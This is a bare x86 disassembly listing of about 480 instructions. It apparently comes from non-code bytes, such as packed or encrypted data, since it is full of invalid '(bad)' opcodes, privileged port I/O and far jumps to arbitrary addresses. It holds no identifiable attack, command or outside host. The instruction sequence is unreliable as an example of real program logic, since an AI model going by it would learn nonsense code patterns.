  417a96:	sub    BYTE PTR [esi-0x34],cl
  417a99:	mov    dh,0x6e
  417a9b:	fisttp DWORD PTR [edi+edi*2+0x50950f51]
  417aa2:	in     al,dx
  417aa3:	inc    esi
  417aa4:	push   ebx
  417aa5:	lock sbb BYTE PTR [edi+ebp*4],al
  417aa9:	into   
  417aaa:	mov    al,0x50
  417aac:	push   0x610c4ce4
  417ab1:	ret    0x409
  417ab4:	add    al,0xaa
  417ab6:	mov    ebx,0x5731225e
  417abb:	mov    eax,ds:0x19cb98df
  417ac0:	xchg   edx,eax
  417ac1:	idiv   DWORD PTR [ebx]
  417ac3:	fild   DWORD PTR [ecx-0x2c7c01da]
  417ac9:	cmp    al,0x53
  417acb:	in     eax,0xfa
  417acd:	mov    eax,0x6f3d6bd
  417ad2:	inc    esp
  417ad3:	pop    edi
  417ad4:	retf   0x4855
  417ad7:	(bad)  
  417ad9:	aas    
  417ada:	in     al,0xf2
  417adc:	xor    DWORD PTR [esi],0x9ba48c06
  417ae2:	adc    eax,0xb678aa5d
  417ae7:	addr16 ret 
  417ae9:	cli    
  417aea:	fild   QWORD PTR [ebx]
  417aec:	imul   esi,esi,0x20
  417aef:	dec    edi
  417af0:	dec    ebp
  417af1:	mov    ah,BYTE PTR [edi-0x4e]
  417af4:	or     al,0x31
  417af6:	dec    ebx
  417af7:	lods   eax,DWORD PTR ds:[esi]
  417af8:	and    ch,dh
  417afa:	add    al,0x2c
  417afc:	jecxz  0x417b52
  417afe:	adc    BYTE PTR ds:0x9f7b23d0,ch
  417b04:	add    BYTE PTR [edx-0x35],cl
  417b07:	test   BYTE PTR [ebx],dh
  417b09:	mov    ebp,0xadfa7df7
  417b0e:	push   cs
  417b0f:	fcomp  DWORD PTR [ebx+0x7ffb69c4]
  417b15:	xchg   esp,eax
  417b16:	(bad)  
  417b17:	and    al,0x8
  417b19:	fwait
  417b1a:	jecxz  0x417ab9
  417b1c:	mov    DWORD PTR [eax-0x12c7a972],ecx
  417b22:	scas   al,BYTE PTR es:[edi]
  417b23:	lods   al,BYTE PTR ds:[esi]
  417b24:	mov    esi,0x6b78e540
  417b29:	aam    0xbd
  417b2b:	sti    
  417b2c:	cwde   
  417b2d:	xchg   ebp,eax
  417b2e:	jge    0x417b9a
  417b30:	popf   
  417b31:	pop    ecx
  417b32:	leave  
  417b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b34:	leave  
  417b35:	(bad)  
  417b36:	mov    edi,0x1c24748c
  417b3b:	dec    edi
  417b3c:	and    esp,DWORD PTR [ebx-0x2021c27b]
  417b42:	jmp    0x3a7ab5f6
  417b47:	sub    esp,DWORD PTR [ecx+eax*8]
  417b4a:	ja     0x417ae6
  417b4c:	stos   BYTE PTR es:[edi],al
  417b4d:	sbb    edi,DWORD PTR [ebx-0x71a83061]
  417b53:	fcomp  DWORD PTR [ebx+edx*4+0x12]
  417b57:	(bad)  
  417b58:	aas    
  417b59:	(bad)  
  417b5a:	in     eax,dx
  417b5b:	xor    ebp,eax
  417b5d:	mov    eax,DWORD PTR [ebp-0x6cf37f49]
  417b63:	imul   edx,DWORD PTR ds:0xbcbbbcae,0x1b0ac33f
  417b6d:	pushf  
  417b6e:	jmp    0x417bde
  417b70:	stc    
  417b71:	dec    ebp
  417b72:	push   ebp
  417b73:	xor    DWORD PTR [ebx],0x5f
  417b76:	pop    edx
  417b77:	mov    ch,0x58
  417b79:	pop    ss
  417b7a:	and    bl,BYTE PTR cs:[edx+0x1c309fb1]
  417b81:	dec    ebp
  417b82:	push   ss
  417b83:	enter  0xcc95,0xa4
  417b87:	fnstcw WORD PTR [ebx+eax*1]
  417b8a:	xor    esp,DWORD PTR [esi-0x7703bfc0]
  417b90:	add    ebx,DWORD PTR [ecx]
  417b92:	call   0x9aeb:0x923e5703
  417b99:	js     0x417b4f
  417b9b:	neg    DWORD PTR [ecx+0x14]
  417b9e:	shr    dh,0x1f
  417ba1:	in     eax,0x4a
  417ba3:	jl     0x417b99
  417ba5:	bound  ebp,QWORD PTR [bx+si+0x2a]
  417ba9:	jnp    0x417b43
  417bab:	aad    0xe4
  417bad:	mov    eax,ds:0x4cd6e835
  417bb2:	lds    ebx,FWORD PTR [edx-0x3d]
  417bb5:	(bad)  
  417bb6:	icebp  
  417bb7:	addr16 xchg ebp,eax
  417bb9:	xchg   esi,eax
  417bba:	pop    ds
  417bbb:	or     DWORD PTR [ecx],esp
  417bbd:	dec    ebx
  417bbe:	jmp    0x417bd5
  417bc0:	enter  0x1c7a,0xdd
  417bc4:	push   es
  417bc5:	test   BYTE PTR [ecx-0x8619d27],0xaa
  417bcc:	and    al,0x5f
  417bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bcf:	push   cs
  417bd0:	pop    esp
  417bd1:	jge    0x417b9d
  417bd3:	xchg   esi,eax
  417bd4:	mov    eax,ds:0x85693d2a
  417bd9:	popf   
  417bda:	xchg   ebp,eax
  417bdb:	call   0xded1:0xcb4d0253
  417be2:	adc    ch,BYTE PTR [edx]
  417be4:	push   ds
  417be5:	mov    ecx,0xb9b688cb
  417bea:	xchg   edi,eax
  417beb:	lock retf 0xbd87
  417bef:	inc    esi
  417bf0:	and    al,0xf2
  417bf2:	(bad)  
  417bf4:	inc    ebp
  417bf5:	idiv   BYTE PTR [edx+0x69]
  417bf8:	mov    ebp,0xfff1586f
  417bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bfe:	xchg   esp,eax
  417bff:	pop    ebx
  417c00:	ret    0x1923
  417c03:	inc    ebp
  417c04:	mov    ecx,0xe3846f55
  417c09:	dec    eax
  417c0a:	jle    0x417c54
  417c0c:	(bad)  
  417c0d:	xor    BYTE PTR [ecx+0x11b2094e],cl
  417c13:	jo     0x417bda
  417c15:	sbb    BYTE PTR [ecx+0x18],0xd0
  417c19:	jmp    0x1d887378
  417c1e:	mov    esp,0x1b2526c5
  417c23:	adc    DWORD PTR [ebx+ebx*8-0x73b835de],esp
  417c2a:	jb     0x417c37
  417c2c:	xor    al,0x42
  417c2e:	xor    eax,0x9f6dae24
  417c33:	xor    al,0x6
  417c35:	pop    eax
  417c36:	xchg   esp,eax
  417c37:	shl    esi,1
  417c39:	pop    ds
  417c3a:	pop    ebp
  417c3b:	or     BYTE PTR [edi-0x584a086f],cl
  417c41:	fnstenv [ebx-0x19000b07]
  417c47:	in     al,dx
  417c48:	lods   eax,DWORD PTR ds:[esi]
  417c49:	mov    al,0x96
  417c4b:	mov    edi,0x2e84a94d
  417c50:	(bad)  
  417c51:	add    edx,DWORD PTR [edx+0x7e]
  417c54:	inc    esi
  417c55:	out    0x43,al
  417c57:	mov    edx,0x960a5f91
  417c5c:	jb     0x417c67
  417c5e:	test   BYTE PTR [edi*8+0x3e3b7da2],0x4b
  417c66:	xchg   BYTE PTR [edi+0x6f701a01],cl
  417c6c:	scas   al,BYTE PTR es:[edi]
  417c6d:	fisttp WORD PTR [ecx-0x7ec527f]
  417c73:	test   al,0x64
  417c75:	xor    ecx,ebx
  417c77:	lahf   
  417c78:	les    edi,FWORD PTR [eax-0x71]
  417c7b:	lea    ecx,[edi]
  417c7d:	jmp    0xee1af05e
  417c82:	mov    cl,0xfe
  417c84:	jl     0x417cc1
  417c86:	(bad)  
  417c88:	js     0x417c85
  417c8a:	std    
  417c8b:	data16 repz out dx,al
  417c8e:	(bad)  
  417c8f:	imul   BYTE PTR ss:[edx+0x66]
  417c93:	leave  
  417c94:	mov    cl,0xc8
  417c96:	push   ebp
  417c97:	icebp  
  417c98:	popa   
  417c99:	push   edi
  417c9a:	push   edx
  417c9b:	cmp    BYTE PTR [eax*4-0x14b3ec0b],cl
  417ca2:	xchg   BYTE PTR [edx-0xd9c5852],cl
  417ca8:	xor    eax,0x2ecf55c1
  417cad:	push   eax
  417cae:	int    0xe6
  417cb0:	mov    cl,0xc9
  417cb2:	sub    DWORD PTR [edx+edi*2+0x4aad600c],0xe8cba9b
  417cbd:	adc    cl,BYTE PTR [eax-0x3f]
  417cc0:	add    ch,BYTE PTR [ecx]
  417cc2:	fwait
  417cc3:	call   0xf0efede7
  417cc8:	iret   
  417cc9:	adc    esp,ebx
  417ccb:	push   eax
  417ccc:	cmp    BYTE PTR [esi+0x7065e1f2],dh
  417cd2:	inc    esi
  417cd3:	inc    ecx
  417cd4:	jns    0x417d23
  417cd6:	or     BYTE PTR [esi],bh
  417cd8:	sub    al,0x87
  417cda:	xchg   edi,eax
  417cdb:	outs   dx,BYTE PTR ds:[esi]
  417cdc:	imul   esi,DWORD PTR [esi+eax*4-0x2b],0xffffffbe
  417ce1:	mov    dl,0xb8
  417ce3:	sub    eax,0x5511f836
  417ce8:	cld    
  417ce9:	add    ecx,edi
  417ceb:	mov    al,0xae
  417ced:	pop    edx
  417cee:	inc    edi
  417cef:	out    0x84,eax
  417cf1:	call   0xdc68:0x57064273
  417cf8:	inc    eax
  417cf9:	mov    edi,0xd97d96df
  417cfe:	adc    BYTE PTR [ebp+0x223563aa],bl
  417d04:	popa   
  417d05:	fs jns 0x417d87
  417d08:	and    DWORD PTR [esp+edx*2-0xa],0x29
  417d0d:	adc    DWORD PTR [esi],esi
  417d0f:	fwait
  417d10:	sub    BYTE PTR [edi+0x6367fdbc],ah
  417d16:	pop    esi
  417d17:	mov    bh,0xcb
  417d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d1a:	jbe    0x417d04
  417d1c:	enter  0x6781,0x24
  417d20:	xor    DWORD PTR [edx],edx
  417d22:	in     eax,dx
  417d23:	push   ss
  417d24:	sub    DWORD PTR [edx+0x787c2ac5],eax
  417d2a:	pop    esi
  417d2b:	(bad)  
  417d2c:	sbb    esi,DWORD PTR [eax-0x2bb6646a]
  417d32:	sbb    bl,dh
  417d34:	dec    esi
  417d35:	sub    al,0x2d
  417d37:	fistp  WORD PTR [edi-0x10002bd3]
  417d3d:	outs   dx,DWORD PTR ds:[esi]
  417d3e:	add    DWORD PTR [ebp+0x453ad2a1],esp
  417d44:	jmp    0xd3c1:0xd9e9457c
  417d4b:	mov    dh,BYTE PTR cs:[eax+0x1ca2cac3]
  417d52:	loope  0x417d7c
  417d54:	cmp    al,BYTE PTR [eax]
  417d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d57:	adc    eax,0xd2bdc102
  417d5c:	adc    eax,DWORD PTR [bp+0x4350]
  417d61:	jns    0x417dda
  417d63:	mov    esp,0xff4bba5
  417d68:	jne    0x417d49
  417d6a:	sub    eax,0x455e990
  417d70:	(bad)  
  417d71:	mov    dh,0x9a
  417d73:	outs   dx,DWORD PTR ds:[esi]
  417d74:	push   ebx
  417d75:	pop    ecx
  417d76:	xor    BYTE PTR [eax],0x46
  417d79:	mov    esi,0x97996b7f
  417d7e:	les    ecx,FWORD PTR [esi]
  417d80:	sub    cl,BYTE PTR [esp+edi*1+0x78986408]
  417d87:	sub    ebp,DWORD PTR [esi]
  417d89:	and    al,0x5d
  417d8b:	add    eax,0x193a9e3f
  417d90:	sar    DWORD PTR [esi+ecx*1-0x29e82306],cl
  417d97:	mov    ebx,0xd818ddb4
  417d9c:	aas    
  417d9d:	jmp    0x417d27
  417d9f:	cmp    BYTE PTR [ecx+0x48b76790],dh
  417da5:	add    ax,0x65b0
  417da9:	ficom  DWORD PTR [eax]
  417dab:	sub    al,0x19
  417dad:	jmp    0x8385:0x83afe4ba
  417db4:	std    
  417db5:	jnp    0x417e1c
  417db7:	mov    bl,0x4b
  417db9:	mov    BYTE PTR [edx],ch
  417dbb:	xor    eax,0xf891be65
  417dc0:	out    0x6b,eax
  417dc2:	pushf  
  417dc3:	mov    cl,0x8f
  417dc5:	dec    ebp
  417dc6:	xor    bl,dl
  417dc8:	arpl   ax,bp
  417dca:	fwait
  417dcb:	test   ebx,0x3d0e1414
  417dd1:	mov    ds:0xdbadaa65,al
  417dd6:	fcmovb st,st(7)
  417dd8:	(bad)  
  417dd9:	scas   eax,DWORD PTR es:[edi]
  417dda:	mov    ebp,0x6b101da6
  417ddf:	lea    eax,[ebp+0x3e]
  417de2:	aad    0xd3
  417de4:	sar    dh,1
  417de6:	cmp    DWORD PTR [esi-0x2e],0x5a
  417dea:	mov    esi,DWORD PTR [eax+0x371efdda]
  417df0:	mov    al,ds:0x96bde5d7
  417df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df6:	dec    esi
  417df7:	jne    0x417e36
  417df9:	mov    WORD PTR [ebx-0x580b7aff],?
  417dff:	sar    DWORD PTR [edx],1
  417e01:	es loop 0x417ddb
  417e04:	fisttp DWORD PTR [edi]
  417e06:	pop    ebx
  417e07:	rol    ah,0x1a
  417e0a:	dec    ecx
  417e0b:	data16 adc cl,BYTE PTR [esi+ecx*8+0x42]
  417e10:	cmp    al,BYTE PTR [eax+0x2d56d94c]
  417e16:	and    BYTE PTR [edi-0xa538a21],0x53
  417e1d:	sbb    ch,BYTE PTR ds:0x3498cc37
  417e23:	retf   
  417e24:	jb     0x417e21
  417e26:	fidivr DWORD PTR [ebx+ebx*8]
  417e29:	ret    0x7677
  417e2c:	(bad)  [esi+ebp*4]
  417e2f:	xchg   ebx,eax
  417e30:	cwde   
  417e31:	daa    
  417e32:	jmp    0x6803:0x2fc3fcc4
  417e39:	std    
  417e3a:	sub    BYTE PTR [esi-0x2d],ch
  417e3d:	cdq    
  417e3e:	imul   edi,DWORD PTR [esi+0x20d50b64],0x609b786c
  417e48:	inc    esp
  417e49:	dec    ebp
  417e4a:	hlt    
  417e4b:	mov    ds:0x332db4f,eax
  417e50:	jmp    0x417e34
  417e52:	lods   al,BYTE PTR ds:[esi]
  417e53:	xor    DWORD PTR [esi-0x3e0fe577],edi
  417e59:	test   bh,ch
  417e5b:	ss dec edi
  417e5d:	and    ebp,ebp
  417e5f:	test   DWORD PTR [esi-0x6e],ebx
  417e62:	and    BYTE PTR [esi+0x42629aea],dl
  417e68:	addr16 in eax,dx
  417e6a:	out    dx,al
  417e6b:	unpckhps xmm5,XMMWORD PTR [edx-0x56]
  417e6f:	(bad)  
  417e70:	jg     0x417e99
  417e72:	mov    bh,0x4d
  417e74:	bound  ebp,QWORD PTR [eax-0x72c91380]
  417e7a:	cs (bad) 
  417e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e7d:	xchg   ecx,eax
  417e7e:	lea    ecx,[esi+esi*4-0x6d3e6933]
  417e85:	test   DWORD PTR [ebx-0x788824f3],ebp
  417e8b:	cmp    dl,BYTE PTR [ecx]
  417e8d:	arpl   WORD PTR [edi+0x490cce91],cx
  417e93:	xor    ebp,DWORD PTR [ebx]
  417e95:	adc    bl,dl
  417e97:	cli    
  417e98:	pop    esi
  417e99:	nop
  417e9a:	mov    ds:0xb862653f,al
  417e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea0:	fist   DWORD PTR [ecx-0x1ce53b2a]
  417ea6:	stos   DWORD PTR es:[edi],eax
  417ea7:	test   al,0x14
  417ea9:	pop    ss
  417eaa:	test   DWORD PTR [eax-0x48],esp
  417ead:	push   edx
  417eae:	in     al,0x12
  417eb0:	scas   eax,DWORD PTR es:[edi]
  417eb1:	mov    DWORD PTR [edi-0x693d3734],ecx
  417eb7:	pop    DWORD PTR [ecx]
  417eb9:	xlat   BYTE PTR ds:[ebx]
  417eba:	popf   
  417ebb:	and    dh,dl
  417ebd:	dec    esi
  417ebe:	adc    ah,BYTE PTR [eax-0x3c]
  417ec1:	xor    BYTE PTR [edx-0x17],ch
  417ec4:	jbe    0x417f20
  417ec6:	mov    bl,0xc1
  417ec8:	add    DWORD PTR [eax-0x9],edi
  417ecb:	popa   
  417ecc:	(bad)  
  417ecd:	mov    edi,0xd2b3f605
  417ed2:	sbb    BYTE PTR [eax],bl
  417ed4:	pop    ds
  417ed5:	fs cmc 
  417ed7:	or     al,0x8a
  417ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417eda:	add    ch,al
  417edc:	shl    dl,0x11
  417edf:	mov    edi,0x5973846a
  417ee4:	outs   dx,DWORD PTR ds:[esi]
  417ee5:	cmp    DWORD PTR [ebx],edi
  417ee7:	lods   eax,DWORD PTR ds:[esi]
  417ee8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eea:	xchg   DWORD PTR [ebx+0x3644b612],edx
  417ef0:	mov    ch,BYTE PTR [edx-0x47]
  417ef3:	sub    ebp,edi
  417ef5:	or     ah,ch
  417ef7:	mov    edi,0xcebce349
  417efc:	out    dx,al
  417efd:	jle    0x417f47
  417eff:	cli    
  417f00:	cmp    eax,0x87d81e82
  417f05:	dec    ecx
  417f06:	mov    dh,cl
  417f08:	sbb    BYTE PTR [ebx],0xad
  417f0b:	sub    ecx,esi
  417f0d:	xor    al,0xa1
  417f0f:	xchg   DWORD PTR [ebp+0x53a9f9a3],esp
  417f15:	pop    esi
  417f16:	sbb    BYTE PTR [eax-0x441ab304],bh
  417f1c:	xchg   ecx,eax
  417f1d:	dec    ebp
  417f1e:	mov    dh,bl
  417f20:	jns    0x8d5afd01
  417f26:	aas    
  417f27:	fstp   QWORD PTR [ebp+esi*4+0x6b]
  417f2b:	gs dec edx
  417f2d:	pop    edx
  417f2e:	aaa    
  417f2f:	in     eax,0x87
  417f31:	xlat   BYTE PTR ds:[ebx]
  417f32:	jne    0x417ecf
  417f34:	jno    0x417eb6
  417f36:	ret    
  417f37:	xchg   ebx,eax
  417f38:	in     al,dx
  417f39:	repnz out 0xf5,eax
  417f3c:	xor    eax,0x8e5e081e
  417f41:	xor    eax,0xb05e5366
  417f46:	test   eax,0xd3df2deb
  417f4b:	es cmp eax,0xbabb19e3
  417f51:	into   
  417f52:	stos   BYTE PTR es:[edi],al
  417f53:	imul   esi,DWORD PTR [edx+0x20],0x3
  417f57:	imul   edx,DWORD PTR [edx+0x6],0x2d11a258
  417f5e:	mov    dl,cl
  417f60:	push   0x3
  417f62:	fcomp  QWORD PTR [ebp+0x2d]
  417f65:	add    eax,DWORD PTR [edi+0x7f]
  417f68:	cmp    dh,al
  417f6a:	jnp    0x417f42
  417f6c:	pop    ss
  417f6d:	and    BYTE PTR [ecx+ecx*2+0xdbeb4d2],0x8d
  417f75:	xor    BYTE PTR [ebx+esi*1+0x17d35858],bl
  417f7c:	aad    0xf6
  417f7e:	test   DWORD PTR [ecx],ebp
  417f80:	mov    dh,0x7f
  417f82:	jg     0x417fc3
  417f84:	(bad)  
  417f85:	sub    esp,DWORD PTR ds:0x6a355b6
  417f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f8c:	pop    ss
  417f8d:	mov    dl,0xef
  417f8f:	add    eax,0x68967555
  417f94:	jmp    0x417fe7
  417f96:	dec    edi
  417f97:	les    esi,FWORD PTR [ecx+0x72]
  417f9a:	in     al,dx
  417f9b:	cmp    al,0xf5
  417f9d:	xchg   ebp,eax
  417f9e:	mov    DWORD PTR [esi+0x55],ebp
  417fa1:	push   ebx
  417fa2:	or     DWORD PTR ds:0xd9f11943,edi
  417fa8:	sub    al,0xef
  417faa:	xchg   esi,eax
  417fab:	mov    edi,0x14d5ec5
  417fb0:	loope  0x417f48
  417fb2:	or     eax,0x539bf50
  417fb7:	cld    
  417fb8:	add    BYTE PTR [esi+ebp*2-0x77b4c2d4],ch
  417fbf:	call   0xd9c6:0x1ba735b8
  417fc6:	dec    eax
  417fc7:	push   ecx
  417fc8:	lods   eax,DWORD PTR ds:[esi]
  417fc9:	xor    eax,0xc8e772db
  417fce:	xchg   cx,ax
  417fd0:	mov    cl,0x96
  417fd2:	xor    al,0x6c
  417fd4:	mov    esp,eax
  417fd6:	jg     0x418041
  417fd8:	std    
  417fd9:	test   eax,0xe0361b16
  417fde:	adc    al,0xa9
  417fe0:	sbb    eax,0x42b5d9e5
  417fe5:	dec    edi
  417fe6:	jecxz  0x417f7e
  417fe8:	fdivr  QWORD PTR [ebx]
  417fea:	jnp    0x417f75
  417fec:	(bad)  
  417fed:	(bad)  
  417fef:	push   eax
  417ff0:	push   eax
  417ff1:	ret    
  417ff2:	fs jecxz 0x417fc4
  417ff5:	loop   0x418052
  417ff7:	add    eax,0xfae8b206
  417ffc:	popa   
  417ffd:	xchg   BYTE PTR [ebx],ch
  417fff:	xchg   edi,eax
  418000:	test   eax,0xbb7318ee
  418005:	(bad)  
  418006:	mov    dh,0xe1
  418008:	push   es
  418009:	sti    
  41800a:	fst    QWORD PTR [edi+0x65]
  41800d:	xor    BYTE PTR [ecx-0x1f],dh
  418010:	shr    DWORD PTR [ebx+0x607d1263],1
  418016:	pop    eax
  418017:	(bad)  
  418018:	pop    esi
  418019:	loope  0x417f9b
  41801b:	outs   dx,DWORD PTR ds:[esi]
  41801c:	dec    esp
  41801d:	cmp    al,0xe9
  41801f:	or     esp,DWORD PTR [ecx-0x5]
  418022:	idiv   BYTE PTR [edx-0x6b]
  418025:	cmc    
  418026:	call   0xc8d67141
  41802b:	imul   eax,DWORD PTR [esi],0x47
  41802e:	adc    ch,bl
  418030:	mov    eax,0x19c3d8e
  418035:	xchg   ebp,eax
  418036:	stos   BYTE PTR es:[edi],al
  418037:	xchg   edx,eax
  418038:	loop   0x41808f
  41803a:	xchg   ecx,eax
  41803b:	cmp    eax,0x993835e6
  418040:	push   ebp
  418041:	retf   
  418042:	mov    dl,0x2
  418044:	lock cmp esi,DWORD PTR [ecx+0x37ded54c]
  41804b:	fs ret 
  41804d:	push   edi
  41804e:	cmp    BYTE PTR [esp+ebx*2-0x1a],dh
  418052:	std    
  418053:	outs   dx,DWORD PTR ds:[esi]
  418054:	(bad)  
  418055:	cmc    
  418056:	lods   al,BYTE PTR ds:[esi]
  418057:	mov    ebp,0x44cc6098
  41805c:	mov    ds:0x133c610,al
  418061:	(bad)  
  418062:	dec    edi
  418063:	push   esi
  418064:	mov    esi,0xff1ccf81
  418069:	cli    
  41806a:	(bad)  
  41806b:	cmc    
  41806c:	ror    DWORD PTR [eax],cl
  41806e:	xchg   esi,eax
  41806f:	test   al,0x1e
  418071:	shl    DWORD PTR [edi],1
  418073:	jnp    0x418019
  418075:	or     ch,bh
  418077:	and    eax,0x8d8333c5
  41807c:	pop    ds
  41807d:	jbe    0x41808e
  41807f:	nop
  418080:	jne    0x41802c
  418082:	cs jmp 0xfdac:0xb2bfcc36
  41808a:	call   0xe18d:0x9bae90ef
  418091:	add    BYTE PTR ds:0xf1ff3100,bh
  418097:	icebp  
  418098:	mov    eax,DWORD PTR [ecx-0x77]
  41809b:	jge    0x4180a9
  41809d:	cmp    DWORD PTR [ebp-0x52],ecx
  4180a0:	jecxz  0x4180bf
  4180a2:	xor    dl,al
  4180a4:	icebp  
  4180a5:	pop    edx
  4180a6:	sub    eax,0xa78a4240
  4180ab:	mov    al,ds:0x1c63bf8d
  4180b0:	pop    ecx
  4180b1:	into   
  4180b2:	sbb    al,BYTE PTR [ecx+0xb]
  4180b5:	mov    dh,0x27
  4180b7:	pop    esi
  4180b8:	fwait
  4180b9:	pop    esp
  4180ba:	mov    ebx,0x5d079be7
  4180bf:	(bad)  
  4180c0:	fsincos 
  4180c2:	std    
  4180c3:	sbb    BYTE PTR [ebx-0x650314dd],dh
  4180c9:	shl    edx,cl
  4180cb:	aam    0x6d
  4180cd:	jmp    0x418100
  4180cf:	fs jl  0x418072
  4180d2:	sbb    edx,DWORD PTR [ebp+ecx*8+0xa]
  4180d6:	mov    esi,0xef08b480
  4180db:	std    
  4180dc:	inc    esp
  4180dd:	push   ds
  4180de:	mov    ds:0xe86758f5,al
  4180e3:	(bad)  
  4180e4:	inc    ecx
  4180e5:	adc    bl,BYTE PTR [esi+0x3f]
  4180e8:	push   ebp
  4180e9:	scas   eax,DWORD PTR es:[edi]
  4180ea:	push   0x1e
  4180ec:	push   ebx
  4180ed:	(bad)  
  4180ee:	xchg   BYTE PTR [eax-0x7f876dd5],cl
  4180f4:	adc    cl,BYTE PTR [esi-0x4d]
  4180f7:	fisub  DWORD PTR [esi+0x1a]
  4180fa:	pop    es
  4180fb:	inc    edx
  4180fc:	hlt    
  4180fd:	in     al,dx
  4180fe:	or     eax,0x9a7f9664
  418103:	sbb    eax,0xb4d81d6
  418108:	pop    ss
  418109:	dec    ecx
  41810a:	adc    ch,BYTE PTR [edi]
  41810c:	aad    0x71
  41810e:	(bad)  
  41810f:	lock cmp BYTE PTR [edx+0x6ffef5e0],ah
  418116:	mov    dh,0xd6
  418118:	popf   
  418119:	mov    al,0x50
  41811b:	paddsb mm6,QWORD PTR [ebx-0x7890bb15]
  418122:	cld    
  418123:	fadd   st(2),st
  418125:	ret    
  418126:	pshufw mm1,QWORD PTR [eax-0x51],0x1e
  41812b:	int3   
  41812c:	scas   eax,DWORD PTR es:[edi]
  41812d:	pop    eax
  41812e:	xchg   bx,ax
  418130:	adc    DWORD PTR ds:0xd8a8befa,edx
  418136:	bound  ecx,QWORD PTR [ecx]
  418138:	jecxz  0x4180df
  41813a:	out    dx,al
  41813b:	ror    BYTE PTR [ecx+esi*4-0x33],1
  41813f:	jb     0x41818a
  418141:	(bad)  
  418142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418143:	popa   
  418144:	shr    dl,0x24
  418147:	ins    BYTE PTR es:[edi],dx
  418148:	pop    eax
  418149:	mov    edx,0x2f2ff0b
  41814e:	fldenv [edx]
  418150:	inc    eax
  418151:	lods   eax,DWORD PTR ds:[esi]
  418152:	fnstenv [edx+edi*2-0x54]
  418156:	imul   esi,esp,0xfffffffe
  418159:	inc    eax
  41815a:	retf   0x56c5
  41815d:	lea    ecx,[ebp+esi*1+0x24896c7f]
  418164:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  418166:	addr16 dec edx
  418168:	xor    ecx,DWORD PTR [edi-0x79]
  41816b:	out    0x5b,al
  41816d:	test   bh,0xfe
  418170:	mov    eax,DWORD PTR [ecx-0x734232f0]
  418176:	aam    0xf
  418178:	pop    ebx
  418179:	mov    al,ds:0x6ceeffbc
  41817e:	popa   
  41817f:	js     0x4181eb
  418181:	mov    dh,0xf1
  418183:	push   ss
  418184:	push   ss
  418185:	retf   
  418186:	mov    edx,0x3d67d3a0
  41818b:	jno    0x418158
  41818d:	jge    0x4181d8
  41818f:	mov    DWORD PTR [ebp+0x60],ebx
  418192:	stos   DWORD PTR es:[edi],eax
  418193:	mov    fs,WORD PTR [ebx]
  418195:	std    
  418196:	loope  0x41813c
  418198:	push   ebx
  418199:	adc    eax,0xe86eb27
  41819e:	sub    eax,0x3a91eabc
  4181a3:	mov    bh,0xe4
  4181a5:	lock cmp BYTE PTR [edi],dl
  4181a8:	cmc    
  4181a9:	dec    esp
  4181aa:	mov    ah,bl
  4181ac:	mov    es,WORD PTR es:[eax]
  4181af:	push   ebp
  4181b0:	test   BYTE PTR [ebp-0x3c1f9d3],0xb7
  4181b7:	mov    dh,0xbd
  4181b9:	jns    0x4181f7
  4181bb:	ja     0x41822f
  4181bd:	outs   dx,DWORD PTR ds:[esi]
  4181be:	fidiv  WORD PTR [edx+0x60]
  4181c1:	fs in  al,0xc6
  4181c4:	outs   dx,BYTE PTR ds:[esi]
  4181c5:	push   ecx
  4181c6:	mov    es,WORD PTR [eax+0x7876589d]
  4181cc:	aad    0xe5
  4181ce:	push   edx
  4181cf:	gs loope 0x4181eb
  4181d2:	mov    ds,WORD PTR [esi]
  4181d4:	jae    0x41824e
  4181d6:	icebp  
  4181d7:	js     0x41816e
  4181d9:	int    0xbf
  4181db:	push   ebp
  4181dc:	sub    dh,ah
  4181de:	pop    ebp
  4181df:	jnp    0x41823e
  4181e1:	gs nop
  4181e3:	bound  ecx,QWORD PTR [ebp+0xe4935b2]
  4181e9:	adc    eax,0x4fa3fff9
  4181ee:	mov    ah,0xf0
  4181f0:	aam    0x47
  4181f2:	addr16 test al,0xf1
  4181f5:	shr    DWORD PTR [ebx+ecx*4],1
  4181f8:	sbb    al,0x4e
  4181fa:	pop    esp
  4181fb:	pop    ebp
  4181fc:	push   esi
  4181fd:	shl    DWORD PTR [edx+0x6],0xc6
  418201:	mov    edx,0x7509b01e
  418206:	fild   QWORD PTR [edi-0x48f62469]
  41820c:	cwde   
  41820d:	jl     0x418219
  41820f:	push   cs
  418210:	push   esi
  418211:	popf   
  418212:	popf   
  418213:	cdq    
  418214:	bound  edi,QWORD PTR [edi+0x1fa61a93]
  41821a:	xchg   esi,eax
  41821b:	adc    bl,bl
  41821d:	xor    esp,DWORD PTR [edi+eax*1+0x1b]
  418221:	sar    BYTE PTR [ebx],cl
  418223:	sub    BYTE PTR [ebx-0x13f20b9e],dl
  418229:	out    0xa4,eax
  41822b:	cmp    ah,BYTE PTR [ecx]
  41822d:	push   ds
  41822e:	sbb    al,0x9b
  418230:	mov    esi,0xf807b52d
  418235:	sti    
  418236:	popa   
  418237:	mov    edi,0xac57a91d
  41823c:	xor    al,0xec
  41823e:	aam    0x50
  418240:	push   edi
  418241:	in     eax,dx
  418242:	cmp    eax,0x70f705ba
  418247:	mov    ah,0xd2
  418249:	xor    DWORD PTR [ebp-0x42],ecx
  41824c:	sub    ecx,DWORD PTR [ebx+0x62]
  41824f:	popa   
  418250:	(bad)  
  418251:	sbb    esp,esi
  418253:	iret   
  418254:	ret    
  418255:	xlat   BYTE PTR ds:[ebx]
  418256:	inc    ebp
  418257:	lock push ebp
  418259:	nop
  41825a:	dec    edi
  41825b:	or     al,0x98
  41825d:	mov    edx,0x1f7f38d9
  418262:	xor    al,0xc8
  418264:	push   ebx
  418265:	and    eax,0x85eb2308
  41826a:	ss test eax,0xa3f1d1f3
  418270:	mov    BYTE PTR ds:0xa8d673b6,bl
  418276:	push   esi
